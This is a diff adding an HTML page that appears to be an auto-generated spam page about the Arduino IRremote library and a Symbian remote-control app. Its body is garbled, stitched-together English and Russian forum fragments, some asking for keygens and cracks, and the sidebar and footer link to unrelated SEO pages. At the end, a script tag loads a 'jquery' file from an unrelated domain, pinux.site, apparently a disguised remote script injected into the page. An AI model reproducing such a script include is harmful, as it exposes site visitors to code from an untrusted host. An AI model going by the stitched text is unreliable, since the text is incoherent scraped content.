@@ -1,0 +1,172 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Irremote - liewaodohy.echoheart.cn</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">liewaodohy.echoheart.cn</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Irremote</h2>
+                            </header>
+                            <p>Infrared remote library for Arduino: send and receive infrared signals with multiple protocols - z3t0/Arduino-IRremote.  Для управления нагрузкой будем использовать инфракрасный датчик, пульт управления и библиотеку для Arduino IRremote. Hello, Having trouble to make these work together, all alone working just fine, was trying to hook the IR remote to A2 and to 2 on Arduino Pro Micro, when running the code just for the remote everything goes well. when adding the FastLed code just to light up the LEDs, IR Remote event is not working anymore. was reading a bit and found out that there might be an issue with the interrupts with Arduino pro micro and the fastled. can anyone put some light on this issue? :) is it even possible?. irRemote 2.0.5: Программа предназначена для управления бытовой техникой через ИК-порт смартфона. 
+Hi, I'm running into some problems. I'm using an adafruit flora v2 (https://learn.adafruit.com/assets/2845). According to their site it is an Atmega32u4. The IRremote library is sending output using the clock and PWM and I can't seem to get that to work. Here's a line irsend where it uses the TIMER_ENABLE_PWM macro, which is defined in boarddefs.h boarddefs.h . Seems like it wants to use pin13 But I don't see a way to connect to a pin13 on the adafruit pinout. What's IRremote Library IRremote, by Ken Shirriff, allows you to receive or transmit Infrared Remote Control codes. You can make your projects controlled by a remote, or make them control other devices like televisions and stereo components. I am trying to combine a ultrasonic sensor and an IR Remote to create a distance sensor. I want to use the remote so that the user can input a distance of their choice and the ultrasonic sensor will measure and light a red LED if it is out of range and a green LED if it is in range. I would also like to program a button that will then restart the program and ask for a new input. The only issue is I don't know how to program the IR remote into the already existing code I have. Right 
+Доброе время суток всем! Использую Библотеку IRremote В ней есть пример IRsendDemo подача ик сигнала на 3 пин, проблемма в том что мне нужно выводить сигнал не на 3 пин I want to control a neopixel strip with an IRremote. But I can't come up with a working method which loops the rainbow() function, but is also interruptable at any second by pressing a button on the remote. I'll be very thankful for any tips #include ltAdafruit_NeoPixel.hgt #define PIXEL_PIN 13 #define PIXEL_COUNT 5 Adafruit_NeoPixel strip = Adafruit_NeoPixel(PIXEL_COUNT, PIXEL_PIN, NEO_GRB + NEO_KHZ800); #include ltIRremote.hgt int newValue; Клуб смартфонов и телефонов Nokia, Скачать Psiloc IrRemote v.1.04 для Symbian 9.1, 9.2, 9.3 / Бесплатные программы для смартфонов Nokia, программы для смартфонов, темы для nokia. 
+solved - see comments for solution. Hi, I am trying to control my AC (brand: "Pro Klima") from an arduino via IR. Using the IRremote library I had set up a way to receive the IR data from the AC's remote (model: YB1F2) and saved the two codes, as well as the raw data for pressing the on and off button. With this data I am now trying to send on and off signals to the AC when certain criteria are met. However, the AC does not seem to respond to the IR signals. Using a phone camera I confirmed. Send and receive infrared signals with multiple protocols. Hey guys, I bought a TSOP4838 from taydaelectronics and connected it to my arduino uno like this: https://i.redd.it/2vl0bngswy211.png And ran this code: `#include ltIRremote.hgt` `int IR_Recv = 2;` `IRrecv irrecv(IR_Recv);` `decode_results results;` `void setup(){` `Serial.begin(9600); //starts serial communication` `irrecv.enableIRIn(); // Starts the receiver` `}` `void loop(){` `//decodes the infrared input` `if (irrecv.decode(ampresults)){`. Находим исходники в бесплатном гугле с помощью запроса "irremote arduino", открываем первую ссылку и в ней находим заголовочный файл IRremote.h. I am looking for some help regarding a personal project I have. I am trying to replicate the functionality of the Lazer Tag Phoenix LTX so I can build my own Lazer Tag gun. In my initial research I found a few people that had played with the idea and built working prototypes like this guy. https://www.youtube.com/watch?v=98ieFdWqr3E However after starting my work and code I have found that even though I am able to receive the shots from the gun. My guns never register the shots. Народ такой вопрос. У кого IrRemote на N73 ME работает, keygen ом поделитесь у кого естьOnovexeyДайте пожалуйста ссылку на IrRemote?????=))Orenryaтам кейген в комплекте и её подписывать. Using these (https://www.amazon.com/gp/product/B00EFOQEUM/ref=oh_aui_detailpage_o03_s00?ie=UTF8amppsc=) IR emitters and receivers, I wanted to be able to control these (https://www.adafruit.com/product/3330) LCD blackout panels. Essentially I was hoping to put the panels on the face of a box, and the panels be fully black, so you can't see in. When turned to a mirror the IR signal would bounce off the mirror back to the receiver and trigger the panels to go clear. I used this (https://learn. 
+Arduino IRremote : Infrared remote library for Arduino: send and receive infrared signals with multiple protocols. First this is the error i am returned when compiling a sketch: C:\WINDOWS\system32\config\systemprofile\Documents\Arduino\libraries\IRremote\src\IRremoteTools.cpp:5:16: error: 'TKD2' was not declared in this scope int RECV_PIN = TKD2; // the pin the IR receiver is connected to ^ Multiple libraries were found for "IRremote.h" Used: C:\WINDOWS\system32\config\systemprofile\Documents\Arduino\libraries\IRremote Not used: C:\WINDOWS\system32\config\systemprofile\Documents\Arduino. Здравствуйте, друзья! Имеется вот такой вертолетик: и ардуино с ИК приемником и передатчиком Я бы хотел использовать этот пульт для управления ардуиной. Here is the code I'm using, if the line "irrecv.enableIRIn();" is active the motors won't work, if I coment it out, everything works fine. Is there a work around for this? I suppose I can try a different library but "IRLib-master" is a bit intimidating for me. // Adafruit Motor shield library #include ltIRremote.hgt//IR library #include ltAFMotor.hgt// motor shield library AF_DCMotor motor1(1,MOTOR12_1KHZ); AF_DCMotor motor2(2,MOTOR1. Считывание сигнала и управление Arduino с ИК пульта. Для удобства работы с IR сигналами необходимо воспользоваться библиотекой "IRremote.h". Скачать можно в документах. 
+C:\Program Files (x86)\Arduino\libraries\RobotIRremote\src\IRremoteTools.cpp:5:16: error: 'TKD2' was not declared in this scope int RECV_PIN = TKD2; // the pin the IR receiver is connected to CODE: #include ltIRremote.hgt #include ltIRremoteInt.hgt #include ltIRremoteTools.hgt void setup() { // put your setup code here, to run once: } void loop() { // put your main code here, to run repeatedly:. Я задумал сделать универсальный пульт для управления устройствами по каналам IR и Wifi, чтобы можно было управлять бытовой техникой с мобильного телефона или. As suggested in the title, I am wondering if the IR pin is configurable. The sketch tells me that I need to use PWM pin 3 but there is nothing in the code that defines pin 3. How might I change it? I am asking because I am trying to transfer the code to Atmel Studio to put the code on ATtiny85. Незначительное обновление пульта дистанционного управления через ИК-порт. Если у вас работает версия 1.03 и ниже, ставить эту смысла нет, но если раньше. 
+I want to get rid of "Robot IR Remote". based on the IRremote library by Ken Shirriff created 1 May 2013 by X. Yang modified 12 May 2013 by D. Cuartielles This example is in the public domain / // include the necessary libraries #include. Backstory: my TV is connected to my Logitech surround system with a optical cable. And this makes it impossible to change the volume using my TV remote. Fed up with this I thought I'd create a IR bridge that sends the Logitech (NEC IR) command when volume up/down is pressed on my Samsung remote. Anyways, separately receiving and transmitting works. But putting these two together does not. My Arduino stops accepting input from my remote after one command has been sent. Could someone IRremote IRremote.rar. 24.5 KiB 5879 Downloads. So I've picked up yet another piece of hardware from the local store and while it's great that they sell them cheapish and provide example codes for the stuff, it's less great that I get no schematic with it so I am never sure I hook it up right. I hooked up the IR sensor by connecting the data cable (which I assume is the data cable at least to pin 11, the other pins to ground and 5v on my breadboard. When I compile and run the example tho, the serial monitor give NO output? Я использую стандартный приемник 38 кГц с Arduino-IRremote library, и он отлично работает некоторое время, но затем он перестает работать. Функция цикла работает по времени. I am making an adjustable RGB led strip that i can control with my tv remote. I have everything hooked up right, and the code is all similar. The red and the blue work just fine going up and down, just not the green :/ Here is the pastebin link When i press the button to change the green value up or down it registers it, and moves it up or down 20, only once, then my arduino freezes up and nothing else will work, not even the red and blue. I tried altering link to code: https://create.arduino.cc/editor/LogMaker360/d9ec220a-8a3c-4403-897c-e8bf0ff188df/preview Control your arduino with a IR remoter. Car mp3 remot. 
+Hi, I am trying to communicate with Philips mcm166/12 music player via IR. I curently have only IR transmiter, so there is no way for me to duplicate code from remote. My understanding is, that Philips uses RC5/RC6 protocol. I am trying to work with IRLib2 (https://github.com/cyborg5/IRLib2). In manual I found this: gt mySender.send(0x12ab); //send RC6 protocol gt mySender.send(0x12ab); //send RC5 protocol default 13 bits 36 kHz however, I didn't manage to find IR codes in this format. Поставщик: Psiloc Пульт ДУ. Крякнутый+руссификатор. Для работы необходим ИКпорт на телефоне. Порт включать не надо. Базы пультов обновляютса через программу. I have a set of LED strips which came with an IR controller so that i can set it using the remote. I also just purchased addressable LED strip and an arduino to control it. Now my question is: would i need to get an IR shield(i think thats what all attachements are called if my research is correct) to control it with an IR remote and i could completely remove the IR controller box from the picture. My other question is: if they are able to get the IR controller to work with the lights withou. How to use the IRremote Sensor  Free Energy Generator Magnet Coil 100% Real New Technology New Idea Project - Duration:. I'm trying to make a remote turn on 4 leds. When I click up, it turns on one led1 for 2 seconds. when I click left, it turns on led 2 for two seconds and so on. I've gotten the serial monitor to recognize what inputs are left right up and down but having difficulty coding them to turn on the leds. Any suggestions or guides I can follow. Программа irRemote от Psiloc превращает смартфон в универсальный пульт дистанционного управления бытовой техникой. Это маленькое удобное приложение, которое. I am trying to use #include "IRremote.h" #include ltServo.hgt As well as using tone() I received the following error: gtTone.cpp.o (symbol from plugin): In function `timer0_pin_port': gt (.text+0x0): multiple definition of `__vector_7' gt libraries\IRremote\IRremote.cpp.o (symbol from plugin):(.text+0x0): gtfirst defined here gt gtcollect2.exe: error: ld returned 1 exit status gt gtexit status 1 gtError compiling for board Arduino/Genuino 
+Не могу собрать скетч с IRremote.h. Пробовал подключить библиотеку https://github.com/shirriff/Arduino-IRremote к 1.0.4 в ручную и из архива, пишет. i bought an ir led for my arduino mega 2560 kit. I plugged it into pwm pin 3 as per the instructions that were there for the library I am using to send "off" signal to my tv. I checked that the off signal was xA090 by connecting a ir sensor to my arduino kit. now i am trying to send this signal using my ir led . but it isn`t working. please help and thanks in advance. edit: now it is working although the signal is quite weak. i would like to thanks bal00 for the neat camera Обсуждение: IrRemote - стр. 33 / Коммуникация - Форумы All Nokia - все для телефонов Nokia, Форум любителей Nokia, общение, решение проблем телефонов и смартфонов Nokia, фотоальбомы. Heya guys, I’m having a bit of a problem with sending a raw code through the IRremote library. I’ve tried almost everything I can think of and yet I’m still not seeing results. What I’m trying to do is emulate the power button my GE air conditioner’s remote. I loaded up IRrecvDump and captured the following output: B5E9B811 Unknown encoding: B5E9B811 (32 bits) Raw (38): -29676 8350 -4150 500 -1600 500 -1600 500 -1600 500 -550 550 -1550 500 -550 550 -1550 550 -1550 550 -4100 550 -1550 Я строю робот Arduino Mega. Я планирую использовать библиотеку IRremote.h для этого. Я использую несколько библиотек в своем коде, и я не знаю, какие таймеры приняты. Hey. I've got some TSAL7400 ( IR LEDs and am playing around with the IRremote library. Why am I only measuring 2mA current with a 200 ohm resistor? The LED is very dim when viewed through a camera, and is hardly strong enough to effectively send IR signals. Do I need to power the LED with a transistor? What might the harm be in connecting it directly without a resistor, with the current being Закрепленные IP адреса прописаны в пультах для каждого WiFi модуля. В html страничке. Hi, I am using iRremote.h library. I want to receive ir signal and based on ir signal I have used switch to diect it to three different cases. In one of the case I am using switch again after receiving the signal. Second time when I am using the switch statement I have used the if statement if (irrecv.decode(ampresults)). It seems that the problem is not reading this statement. I think the problem is in using the statement irrecv.resume(); I have tried it to place Здесь будет собираться база данных по пультам ДУ от телевизоров и другой бытовой техники, чтобы в случае утери пульта его можно было восстановить на базе ардуино. 
+файл скачано: 4826 раз Эта технология обеспечивает новый уровень безопасности, который обеспечивает защиту операционной системы от неизвестных вирусов. Во-первых спасибо за пример! но он не работал у меня(пришлось его доделать=) #include «IRremote.h». The one I replied in, was in Russian, with cryllic characters. I used google-translate, do translate it into english, and then replied via google-tranlsate (wrote a reply, and translated it back into russian). Уже разобрался скачал библиотеку с гита https://github.com/shirriff/Arduino-IRremote, прошил образцом из неё и всё заработало. </p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="t2cuja-vyazanie-kryuchkom-kvadratnye-motivy-shemy-s-opisaniem.html">Вязание крючком квадратные мотивы схемы с описанием</a></li>
+                                <li><a href="t2cuja-because-beatles-akkordy.html">Because beatles аккорды</a></li>
+                                <li><a href="t2cuja-gost-23508-79.html">Гост 23508 79</a></li>
+                                <li><a href="t2cuja-doneck-shema-gorodskogo-transporta.html">Донецк схема городского транспорта</a></li>
+                                <li><a href="t2cuja-prezentaciya-pro-bukvu-n.html">Презентация про букву н</a></li>
+                                <li><a href="t2cuja-ozon-chitat-knigi.html">Озон читать книги</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"><li>Arduino и библиотека IRremote.</li>
+<li>irRemote 2.0.5 скачать irRemote 2.0.5 бесплатно Программы.</li>
+<li>Библиотека IRremote, irsend Аппаратная платформа Arduino.</li>
+<li>Psiloc IrRemote v.1.04.</li>
+<li>Бибилиотека IRremote и работа с ней Аппаратная платформа.</li>
+<li>IrRemote ivawymabub.</li>
+<li>IRremote.h + пульт ДУ игрушечного.</li>
+<li>Урок 5 - Управление Arduino с помощью пульта ДУ (IR). Библиотека IRremote.</li>
+<li>ESP8266 - IRremote control.</li>
+<li>Psiloc irRemote v.1.04 Скачать системные для Symbin.</li>
+<li>Библиотеки для arduinoarduino project.</li>
+<li>arduino-uno - Arduino IRremote перестает работать.</li>
+<li>Psiloc IrRemote - v1.04ru unsigned скачать бесплатно</li>
+<li>Psiloc IrRemote v1.04 для Symbian OS 9.x S60 - скачать.</li>
+<li>Работа IRremote.h Амперка / Форум.</li>
+<li>Обсуждение: IrRemote - стр. 33 / Коммуникация :: Форумы</li>
+<li>arduino-mega - Почему библиотека сервосистемы конфликтует с irremote.</li>
+<li>ESP8266 - IRremote control.</li>
+<li>Коды пультов ДУ. по библиотеке IrRemote.</li>
+<li>Irremote 1.04 crack husewokin.</li>
+<li>Ардуино: инфракрасный пульт и приемник Класс.</li>
+<li>Re: irREMOTE for Symbian 3rd - Google Groups.</li>
+<li>Arduino Uno. Подключение ИК-приемника.</li>
+</ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="t2cuja-vyzhivshie-1975-2-sezon.html">Выжившие 1975 2 сезон</a></li>
+                                            <li><a href="t2cuja-dogovor-investirovaniya-eto-dogovor-dolevogo-uchastiya.html">Договор инвестирования это договор долевого участия</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="t2cuja-2-000-frankov.html">2 000 франков</a></li>
+                                            <li><a href="t2cuja-skachat-muzykalnye-klipy-2015-v-formate-avi.html">Скачать музыкальные клипы 2015 в формате avi</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="t2cuja-volchitsya-i-pryanosti-2-sezon-skachat-torrent.html">Волчиться и пряности 2 сезон скачать торрент</a></li>
+                                            <li><a href="t2cuja-vyzhivatel-andrey-kruz-audiokniga-slushat-onlayn.html">Выживатель андрей круз аудиокнига слушать онлайн</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="t2cuja-prezentaciya-v-powerpoint-so-zvukom.html">Презентация в powerpoint со звуком</a></li>
+                                            <li><a href="t2cuja-sega-igr-dlya-psp-skachat-torrent.html">Sega игр для psp скачать торрент</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
